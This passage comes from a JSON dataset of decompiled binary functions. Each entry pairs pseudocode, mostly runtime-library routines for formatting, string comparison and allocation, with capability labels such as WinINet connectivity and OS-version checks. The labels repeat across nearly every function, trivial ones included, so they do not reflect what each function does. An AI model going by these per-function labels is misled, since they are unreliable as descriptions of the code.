        "decompiled_code": "\nvoid fcn.00405f01(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t *var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &var_24h;\n    var_10h = 0xffffffff;\n    var_14h = 0x426f80;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = fcn.00404def();\n    if (var_24h != NULL) {\n        var_10h = 0;\n        (**(*var_24h + 8))();\n    }\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 190
    },
    "00405f51": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405f51(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x24) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00403675(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == 0x24)) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.00405fec(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x32), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.00403a35();\n            *puVar4 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 441
    },
    "00405fb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00405fb0(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_ch == NULL) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_10h == 0) {\n        iVar3 = 0;\n    }\n    else {\n        fcn.004058a8(arg_14h);\n        if (*(var_10h + 0xa8) == 0) {\n            iVar3 = fcn.0040230b(arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            do {\n                var_4h = fcn.00403684(*arg_8h, &var_10h);\n                var_4h = var_4h & 0xffff;\n                arg_8h = arg_8h + 1;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uVar4 = fcn.00403684(uVar1, &var_10h);\n                iVar3 = var_4h - (uVar4 & 0xffff);\n                if ((iVar3 != 0) || (var_4h == 0)) break;\n                arg_10h = arg_10h + -1;\n            } while (arg_10h != 0);\n        }\n        if (var_8h != '\\0') {\n            *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 528
    },
    "00405fc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405fc4(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((arg_8h != 0) && (arg_ch != NULL)) {\n        uVar2 = fcn.004046ce(arg_8h, *arg_ch, arg_ch[1], 0);\n        return uVar2;\n    }\n    puVar1 = fcn.00403a35();\n    *puVar1 = 0x16;\n    fcn.004037ce();\n    return 0xffffffff;\n}\n",
        "token_count": 133
    },
    "00405fe2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405fe2(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 334
    },
    "00405fec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405fec(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar1 = fcn.00402b99(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar1 == '\\0') {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 199
    },
    "00405ff6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00405ff6(uint arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    float10 fVar3;\n    double dVar4;\n    \n    puVar2 = fcn.00403a35();\n    uVar1 = *puVar2;\n    *puVar2 = 0;\n    fVar3 = fcn.004023f6(arg_8h, arg_ch);\n    dVar4 = fVar3;\n    *arg_14h = *puVar2;\n    *puVar2 = uVar1;\n    if (arg_10h != 0) {\n        fVar3 = fcn.00402c9d(dVar4, arg_10h);\n        fVar3 = fVar3 * dVar4;\n    }\n    return fVar3;\n}\n",
        "token_count": 204
    },
    "00406000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00406000(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != '\\0') {\n        return 0x1fffffffffffff;\n    }\n    return 0xffffff;\n}\n",
        "token_count": 52
    },
    "00406064": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406064(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00404999(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 354
    },
    "004060af": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060af(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch != 0) {\n        do {\n            if (*(*(arg_8h + -1 + arg_ch) + 0x553c28) == '\\0') {\n                return;\n            }\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != 0);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "004060c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint __cdecl fcn.004060c3(uint arg_8h)\n\n{\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    for (var_ch = 0x18; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x59; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00403b02(&stack0x00000014);\n    return 0x27ad;\n}\n",
        "token_count": 156
    },
    "004060f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004060f0(int32_t arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t arg_14h;\n    uint uVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00403189(arg_8h, 0, 0x1ca);\n    if (*arg_ch != 0) {\n        if ((*arg_ch != 0x2e) || (arg_ch[1] == 0)) {\n            var_4h = 0;\n            arg_14h = fcn.0040370b(arg_ch, 0x556d88);\n            do {\n                if (arg_14h == 0) {\n                    return 0xffffffff;\n                }\n                iVar1 = arg_ch[arg_14h];\n                if (var_4h == 0) {\n                    if (0x3f < arg_14h) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = fcn.00405b64(arg_8h, 0x40, arg_ch, arg_14h);\n                    if (iVar3 != 0) goto code_r0x004adc59;\n                    if (iVar1 == 0x2e) {\n                        var_4h = 1;\n                    }\n                }\n                else {\n                    if (var_4h == 1) {\n                        if (0x3f < arg_14h) {\n                            return 0xffffffff;\n                        }\n                        if (iVar1 == 0x5f) {\n                            return 0xffffffff;\n                        }\n                        uVar4 = 0x40;\n                        iVar3 = arg_8h + 0x80;\n                    }\n                    else {\n                        if (var_4h != 2) {\n                            return 0xffffffff;\n                        }\n                        if (0xf < arg_14h) {\n                            return 0xffffffff;\n                        }\n                        if ((iVar1 != 0) && (iVar1 != 0x2c)) {\n                            return 0xffffffff;\n                        }\n                        uVar4 = 0x10;\n                        iVar3 = arg_8h + 0x100;\n                    }\n                    iVar3 = fcn.00405b64(iVar3, uVar4, arg_ch, arg_14h);\n                    if (iVar3 != 0) goto code_r0x004adc59;\n                }\n                if (iVar1 == 0x2c) {\n                    return 0;\n                }\n                if (iVar1 == 0) {\n                    return 0;\n                }\n                arg_ch = arg_ch + arg_14h + 1;\n                var_4h = var_4h + 1;\n                arg_14h = fcn.0040370b(arg_ch, 0x556d88);\n            } while( true );\n        }\n        iVar3 = fcn.00405b64(arg_8h + 0x100, 0x10, arg_ch + 1, 0xf);\n        if (iVar3 != 0) {\ncode_r0x004adc59:\n            fcn.0040366b(0, 0, 0, 0, 0);\n            pcVar2 = swi(3);\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n        *(arg_8h + 0x11e) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 764
    },
    "00406118": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406118(uint arg_8h)\n\n{\n    int32_t iStack48;\n    int32_t iStack44;\n    \n    for (iStack44 = 0xf; 0 < iStack44; iStack44 = iStack44 + -1) {\n    }\n    for (iStack48 = 0x48; 0 < iStack48; iStack48 = iStack48 + -1) {\n    }\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 112
    },
    "00406122": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406122(uint32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h < 0x1000) {\n        if (arg_8h == 0) {\n            var_4h = 0;\n        }\n        else {\n            var_4h = fcn.00402cbb(arg_8h);\n        }\n    }\n    else {\n        var_4h = fcn.00401ec4(arg_8h);\n    }\n    return var_4h;\n}\n",
        "token_count": 121
    },
    "0040615e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.0040615e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint noname_0;\n    uint arg_10h_00;\n    uint arg_14h_00;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    int32_t arg_18h_00;\n    int32_t unaff_EBP;\n    char *pcVar10;\n    int32_t iVar11;\n    uint32_t arg_1ch_00;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00405434(0x50);\n    uVar8 = *(unaff_EBP + 0x24);\n    iVar2 = *(unaff_EBP + 0x18);\n    pcVar10 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x54) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x58) = iVar2;\n    *(unaff_EBP + -0x44) = pcVar10;\n    if ((uVar8 == 0) || ((*pcVar10 != '+' && (*pcVar10 != '-')))) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = 1;\n    }\n    if (((((*(iVar2 + 0x14) & 0xe00) == 0x800) && (arg_1ch_00 + 2 <= uVar8)) && (pcVar10[arg_1ch_00] == '0')) &&\n       ((pcVar10[arg_1ch_00 + 1] == 'x' || (pcVar10[arg_1ch_00 + 1] == 'X')))) {\n        arg_1ch_00 = arg_1ch_00 + 2;\n    }\n    fcn.004032d3(*(iVar2 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.00403e2c(unaff_EBP + -0x50);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x48) = uVar5;\n    fcn.00405146();\n    fcn.004061db(uVar8, 0);\n    iVar11 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar11 = *(unaff_EBP + -0x28);\n    }\n    fcn.004010fa(*(unaff_EBP + -0x44), uVar8 + *(unaff_EBP + -0x44), iVar11);\n    fcn.004032d3(*(iVar2 + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.00404b3d(unaff_EBP + -0x50);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar6;\n    fcn.00405146();\n    pcVar3 = *(*piVar6 + 0x14);\n    (**0x578000)(unaff_EBP + -0x40);\n    (*pcVar3)();\n    pcVar10 = unaff_EBP + -0x40;\n    *(unaff_EBP + -4) = 3;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar10 = *(unaff_EBP + -0x40);\n    }\n    if ((*pcVar10 != '\\x7f') && ('\\0' < *pcVar10)) {\n        uVar7 = fcn.0040574f();\n        uVar7 = uVar7 & 0xffff;\n        *(unaff_EBP + -0x48) = uVar7;\n        while (((cVar1 = *pcVar10,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar8 - arg_1ch_00))) {\n            uVar8 = uVar8 - cVar1;\n            fcn.004041ce(uVar8, 1, uVar7);\n            if ('\\0' < pcVar10[1]) {\n                pcVar10 = pcVar10 + 1;\n            }\n            uVar7 = *(unaff_EBP + -0x48);\n        }\n    }\n    iVar2 = *(unaff_EBP + -0x58);\n    uVar8 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x48) = uVar8;\n    if (((*(iVar2 + 0x24) < 0) || ((*(iVar2 + 0x24) < 1 && (*(iVar2 + 0x20) == 0)))) || (*(iVar2 + 0x20) <= uVar8)) {\n        iVar11 = 0;\n    }\n    else {\n        iVar11 = *(iVar2 + 0x20) - uVar8;\n    }\n    uVar8 = *(iVar2 + 0x14) & 0x1c0;\n    if (uVar8 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar5 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar8 == 0x100) {\n            arg_18h_00 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                arg_18h_00 = *(unaff_EBP + -0x28);\n            }\n            puVar9 = fcn.00402572(*(unaff_EBP + 8), unaff_EBP + -0x50, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                                  arg_18h_00, arg_1ch_00);\n            uVar5 = *puVar9;\n            uVar4 = puVar9[1];\n            *(unaff_EBP + 0x14) = uVar4;\n            *(unaff_EBP + 0x10) = uVar5;\n            puVar9 = fcn.00405b19(*(unaff_EBP + 8), unaff_EBP + -0x50, uVar5, uVar4, *(unaff_EBP + 0x1c), iVar11);\n            iVar11 = 0;\n            goto code_r0x00475b0d;\n        }\n        puVar9 = fcn.00405b19(*(unaff_EBP + 8), unaff_EBP + -0x50, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                              *(unaff_EBP + 0x1c), iVar11);\n        iVar11 = 0;\n        uVar5 = *puVar9;\n        var_2ch = puVar9[1];\n        var_28h = unaff_EBP + -0x28;\n        *(unaff_EBP + 0x10) = uVar5;\n        *(unaff_EBP + 0x14) = var_2ch;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n    }\n    puVar9 = fcn.00402572(*(unaff_EBP + 8), unaff_EBP + -0x50, uVar5, var_2ch, var_28h, arg_1ch_00);\ncode_r0x00475b0d:\n    uVar5 = puVar9[1];\n    uVar4 = *puVar9;\n    *(unaff_EBP + 0x10) = uVar4;\n    *(unaff_EBP + 0x14) = uVar5;\n    *(unaff_EBP + -0x44) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x44) = *(unaff_EBP + -0x28);\n    }\n    noname_0 = *(unaff_EBP + 8);\n    puVar9 = fcn.00402572(noname_0, unaff_EBP + -0x5c, uVar4, uVar5, *(unaff_EBP + -0x44) + arg_1ch_00 * 2, \n                          *(unaff_EBP + -0x48) - arg_1ch_00);\n    uVar5 = *(unaff_EBP + 0x1c);\n    uVar4 = *(unaff_EBP + -0x54);\n    arg_10h_00 = *puVar9;\n    arg_14h_00 = puVar9[1];\n    *(iVar2 + 0x20) = 0;\n    *(iVar2 + 0x24) = 0;\n    *(unaff_EBP + 0x10) = arg_10h_00;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00405b19(noname_0, uVar4, arg_10h_00, arg_14h_00, uVar5, iVar11);\n    fcn.00402a0e();\n    fcn.00402c7a();\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 2503
    },
    "0040617c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040617c(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar3 = **(in_ECX + 0x46c + uVar1 * 0x10);\n        arg_8h[1] = 0;\n        *arg_8h = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 341
    },
    "0040618b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040618b(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            uVar2 = fcn.004037ce();\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.004038a0(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar2;\n        }\n        iVar3 = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    *arg_8h = iVar3;\n    arg_8h[1] = iVar3 >> 0x1f;\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 345
    },
    "004061ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004061ae(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "004061b3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004061b3(uint32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = param_1;\n    if ((*(param_1 + 0x3c) == '\\0') && (iVar3 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar2 = fcn.0040105a(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar2 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            cVar1 = fcn.0040170d(var_4h);\n            if (cVar1 == '\\0') {\n                *(param_1 + 0x18) = 0xffffffff;\n            }\n            else {\n                *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n            }\n            arg_ch = arg_ch + iVar2;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.004040ed(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, param_1 + 0xc);\n    }\n    return 1;\n}\n",
        "token_count": 393
    },
    "004061e5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.004061e5(uint16_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t in_ECX;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    int32_t iVar6;\n    int32_t arg_8h_00;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    arg_8h_00 = *arg_ch;\n    if (arg_8h == NULL) {\n        iVar2 = 0;\n        while( true ) {\n            uVar1 = fcn.004d86df(arg_8h_00);\n            iVar6 = fcn.00404dc7(0, arg_8h_00, uVar1, arg_14h);\n            if (iVar6 == -1) break;\n            if (iVar6 == 0) {\n                return iVar2;\n            }\n            if (iVar6 == 4) {\n                iVar2 = iVar2 + 1;\n            }\n            arg_8h_00 = arg_8h_00 + iVar6;\n            iVar2 = iVar2 + 1;\n        }\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x2a;\n    }\n    else {\n        puVar5 = arg_8h;\n        var_8h = in_ECX;\n        if (arg_10h != 0) {\n            do {\n                uVar1 = fcn.004d86df(arg_8h_00);\n                iVar2 = fcn.00404dc7(&var_8h, arg_8h_00, uVar1, arg_14h);\n                